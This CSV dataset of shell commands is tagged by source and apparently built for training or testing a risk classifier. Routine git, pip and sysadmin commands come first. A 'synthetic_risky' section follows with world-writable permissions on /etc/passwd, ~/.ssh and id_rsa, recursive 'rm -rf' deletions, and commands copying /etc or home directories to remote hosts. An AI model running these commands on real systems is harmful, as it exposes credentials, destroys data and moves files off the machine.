command,source
ls,bash_history
ls -la,bash_history
ls -lh /var/log,bash_history
cd ~,bash_history
cd ..,bash_history
cd /var/www,bash_history
pwd,bash_history
git status,bash_history
git add .,bash_history
"git commit -m ""fix bug in parser""",bash_history
git push origin main,bash_history
git pull origin main,bash_history
git log --oneline -10,bash_history
git diff HEAD~1,bash_history
git branch -a,bash_history
git checkout -b feature/login,bash_history
git clone https://github.com/example/repo.git,bash_history
git stash,bash_history
git stash pop,bash_history
git fetch --all,bash_history
git merge feature-branch,bash_history
git rebase main,bash_history
git tag v1.0.0,bash_history
pip install requests,bash_history
pip list,bash_history
pip freeze > requirements.txt,bash_history
pip show numpy,bash_history
pip install -r requirements.txt,bash_history
pip uninstall requests -y,bash_history
python3 script.py,bash_history
python3 -m venv venv,bash_history
source venv/bin/activate,bash_history
deactivate,bash_history
"python3 -c ""print('hello')""",bash_history
df -h,bash_history
du -sh *,bash_history
du -h --max-depth=1,bash_history
top,bash_history
htop,bash_history
free -m,bash_history
free -h,bash_history
uname -a,bash_history
whoami,bash_history
id,bash_history
uptime,bash_history
ps aux,bash_history
ps -ef | grep python,bash_history
kill 1234,bash_history
history,bash_history
alias ll='ls -la',bash_history
export PATH=$PATH:/usr/local/bin,bash_history
echo $HOME,bash_history
cat /etc/os-release,bash_history
less /var/log/syslog,bash_history
tail -f /var/log/syslog,bash_history
tail -n 100 /var/log/auth.log,bash_history
"grep -r ""TODO"" .",bash_history
"find . -name ""*.py""",bash_history
mkdir project,bash_history
touch file.txt,bash_history
cp file.txt backup.txt,bash_history
mv old.txt new.txt,bash_history
rm file.txt,bash_history
chmod +x script.sh,bash_history
chown user:user file.txt,bash_history
tar -czvf archive.tar.gz folder/,bash_history
unzip file.zip,bash_history
curl https://api.github.com,bash_history
wget https://example.com/file.txt,bash_history
ssh user@host,bash_history
scp file.txt user@host:/tmp/,bash_history
ping -c 4 google.com,bash_history
ifconfig,bash_history
ip a,bash_history
netstat -tulnp,bash_history
nano file.txt,bash_history
vim file.txt,bash_history
code .,bash_history
docker ps,bash_history
docker images,bash_history
docker-compose up -d,bash_history
docker build -t app .,bash_history
npm install,bash_history
npm run build,bash_history
npm start,bash_history
node app.js,bash_history
yarn install,bash_history
make,bash_history
make install,bash_history
cmake ..,bash_history
gcc file.c -o file,bash_history
python3 -m http.server 8000,bash_history
clear,bash_history
"echo ""hello world""",bash_history
which python3,bash_history
env,bash_history
systemctl status nginx,sysadmin_docs
systemctl restart ssh,sysadmin_docs
systemctl enable docker,sysadmin_docs
systemctl stop apache2,sysadmin_docs
systemctl daemon-reload,sysadmin_docs
systemctl is-active nginx,sysadmin_docs
journalctl -xe,sysadmin_docs
journalctl -u nginx --since today,sysadmin_docs
journalctl -f,sysadmin_docs
journalctl --disk-usage,sysadmin_docs
apt update,sysadmin_docs
apt upgrade -y,sysadmin_docs
apt install curl,sysadmin_docs
apt list --installed,sysadmin_docs
apt-cache search python3,sysadmin_docs
apt remove nginx,sysadmin_docs
sudo apt autoremove,sysadmin_docs
apt-get update,sysadmin_docs
apt-get install -y python3-pip,sysadmin_docs
man ls,sysadmin_docs
crontab -l,sysadmin_docs
crontab -e,sysadmin_docs
date,sysadmin_docs
cal,sysadmin_docs
chmod -R 777 /var/www,synthetic_risky
chmod -R 777 ~/project,synthetic_risky
chmod -R 777 /opt/app,synthetic_risky
chmod -R 777 /srv/data,synthetic_risky
chmod -R 777 ./build,synthetic_risky
chmod -R 777 /home/user/site,synthetic_risky
chmod 777 /etc/passwd,synthetic_risky
chmod 777 ~/.ssh,synthetic_risky
chmod -R 777 /var/www/html,synthetic_risky
chmod -R 777 /usr/local/app,synthetic_risky
chmod -R 777 .,synthetic_risky
chmod -R 777 /mnt/data,synthetic_risky
chmod -R 777 /tmp/uploads,synthetic_risky
chmod -R 777 /home/deploy/releases,synthetic_risky
chmod 777 id_rsa,synthetic_risky
rm -rf ./build,synthetic_risky
rm -rf node_modules,synthetic_risky
rm -rf /home/user/project/old_version,synthetic_risky
rm -rf ~/Downloads/*,synthetic_risky
rm -rf /tmp/*,synthetic_risky
rm -rf .git,synthetic_risky
rm -rf $HOME/.cache,synthetic_risky
rm -rf /var/cache/apt/*,synthetic_risky
rm -rf dist/,synthetic_risky
rm -rf venv/,synthetic_risky
rm -rf __pycache__,synthetic_risky
rm -rf /var/log/*.old,synthetic_risky
rm -rf /opt/app/old_release,synthetic_risky
rm -rf /home/deploy/backups/2023,synthetic_risky
rm -rf target/,synthetic_risky
"tar czf - /home/user | ssh user@remote ""cat > backup.tar.gz""",synthetic_risky
"tar -cf - /var/www | ssh backup@server ""tar xf - -C /backup""",synthetic_risky
scp -r /etc user@remote:/tmp/etc_backup,synthetic_risky
rsync -av /home/user/ user@remote:/backup/,synthetic_risky
